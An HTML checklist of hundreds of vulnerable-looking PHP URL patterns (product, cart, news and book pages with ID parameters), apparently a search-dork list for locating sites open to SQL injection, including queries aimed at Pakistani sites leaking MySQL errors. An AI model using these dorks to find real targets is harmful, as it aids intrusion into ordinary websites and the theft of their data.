<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Sales/view_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?isbn=</p>
</li>
<li><input disabled="" type="checkbox"> <p>knowledge_base/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery/gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detailedbook.php?isbn=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fatcat/home.php?view=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>static.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>answer/default.php?pollID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/unique_event.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery/detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/showthread.php?t=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>knowledge_base/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>html/print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Shop/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resources/index.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/products.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>auction/item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>clan_page.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?sku=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comments.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/?catID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules.php?=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fshstatistic/index.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/products.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>sport.php?revista=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?openparent=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/shownewsarticle.php?articleid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>discussions/10/9/?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>trailer.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item/detail.php?num=</p>
</li>
<li><input disabled="" type="checkbox"> <p>features/view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site/?details&amp;prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>remixer.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>proddetails_print.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pylones/item.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cont=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?ItemId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>video.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>filemanager.php?delete=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/newsletter.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>designcenter/item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/kboard.php?board=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/view_temp.php?table=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazine-details.php?magid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site:.pk intext:Warning: mysql_free_result(): supplied argument is not a valid MySQL result resource in &amp; “id”</p>
</li>
<li><input disabled="" type="checkbox"> <p>site:.pk intext:Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in &amp; “id”</p>
</li>
<li><input disabled="" type="checkbox"> <p>about.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>accinfo.php?cartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>acclogin.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>add.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>add_cart.php?num=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addcart.php?</p>
</li>
<li><input disabled="" type="checkbox"> <p>addItem.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>add-to-cart.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addToCart.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addtomylist.php?ProdId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>adminEditProductFields.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>advSearch_h.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliate.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliate-agreement.cfm?storeid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliates.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ancillary.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>archive.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>phpx?PageID</p>
</li>
<li><input disabled="" type="checkbox"> <p>basket.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Book.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_list.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_view.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>BookDetails.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse_item_details.php Browse_Item_Details.php?Store_Id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>buy.php?</p>
</li>
<li><input disabled="" type="checkbox"> <p>buy.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bycategory.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cardinfo.php?card=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?cart_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart_additem.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart_validate.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cartadd.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cat.php?iCat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog.php?CatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog_item.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog_main.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categorydisplay.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout.php?UserID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout_confirmed.php?order_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout1.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_listCategoriesAndProducts.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_optEmailToFriendForm.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_optReviewReadExec.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_viewItem.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comments_form.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>contact.php?cartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>customerService.php?ID1=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?catID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>description.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Press_Release_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Product_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Service_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>display_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>displayproducts.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>downloadTrial.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>emailproduct.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>emailToFriend.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faq.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faq_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faqs.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>feedback.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>freedownload.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fullDisplay.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>getbook.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>GetItems.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>giftDetail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>help.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cart=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>info.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?eid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?model=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?prodtype=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?shopcd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_details.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_list.php?maingroup item_show.php?code_no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemDesc.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemdetail.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>itemdetails.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>learnmore.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>links.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>list.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>List.php?CatID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>listcategoriesandproducts.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modline.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>myaccount.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.php?item_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>OrderForm.php?Cart=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?PartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>payment.php?CartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pdetail.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>powersearch.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>price.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>privacy.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodbycat.php?intCatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodetails.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodlist.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productDetails.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productDisplay.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>productinfo.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?ViewType=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Category&amp;CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productpage.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?keyword=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products_category.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products_detail.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productsByCategory.php?intCatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodView.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>promo.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>promotion.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pview.php?Item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resellers.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>results.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>savecart.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>search.php?CartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>searchcat.php?search_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Select_Item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Services.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shippinginfo.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?a=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop_details.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopaddtocart.php shopaddtocart.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopbasket.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopbycategory.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcart.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcreatorder.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopcurrency.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdc.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdisplaycategories.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdisplayproduct.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopdisplayproducts.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopexd.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopexd.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopping_basket.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopprojectlogin.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopquery.php?catalogid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopremoveitem.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopreviewadd.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopreviewlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ShopSearch.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shoptellafriend.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopthanks.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>shopwelcome.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_item_details.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showbook.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showStore.php?catID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shprodde.php?SKU=</p>
</li>
<li><input disabled="" type="checkbox"> <p>specials.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store_bycat.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store_listing.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Store_ViewProducts.php?Cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store-details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storefront.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storefronts.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storeitem.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>StoreRedirect.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>subcategories.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tek9.php?</p>
</li>
<li><input disabled="" type="checkbox"> <p>template.php?Action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Item&amp;pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>topic.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tuangou.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>type.php?iType=</p>
</li>
<li><input disabled="" type="checkbox"> <p>updatebasket.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>updates.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_cart.php?title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewcart.php?CartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewCart.php?userID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewCat_h.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewevent.php?EventID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewitem.php?recor=</p>
</li>
<li><input disabled="" type="checkbox"> <p>viewPrd.php?idcategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ViewProduct.php?misc=</p>
</li>
<li><input disabled="" type="checkbox"> <p>voteList.php?item_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>whatsnew.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>WsAncillary.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>WsPages.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>noticiasDetalle.php?xid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>sitio/item.php?idcd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?site=</p>
</li>
<li><input disabled="" type="checkbox"> <p>de/content.php?page_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallerysort.php?iid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?type=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showfeature.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tas/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>profile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>past-event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site/products.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?pId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resources/vulnerabilities_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/index.php?rangeid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>global_projects.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications/view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>display_page.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>lmsrecords_cd.php?cdid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?prd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cat/?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product-list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>debate-detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cbmer/congres/page.php?LAN=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>photogallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/product.php?product_no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>nyheder.htm?show=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_author.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/fonction/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazines/adult_magazine_single_page.php?magid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazines/adult_magazine_full_year.php?magid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/card.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/product.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>e_board/modifyform.html?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>community/calendar-event-fr.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view/7/9628/1.html?reply=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rating.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_detail.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog/main.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categories.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categories.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>hm/inside.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>media/pr.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>books/book.php?proj_nr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/card.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>general.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?t=</p>
</li>
<li><input disabled="" type="checkbox"> <p>usb/devices/showdev.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>templet.php?acticle_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/news/title_show.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?url=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cryolab/content.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ls.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>s.php?w=</p>
</li>
<li><input disabled="" type="checkbox"> <p>abroad/page.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bayer/dtnews.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/temp.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?url=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book/bookcover.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php/en/component/pvm/?view=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/list.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cats.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>software_categories.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>docDetail.aspx?chnum=</p>
</li>
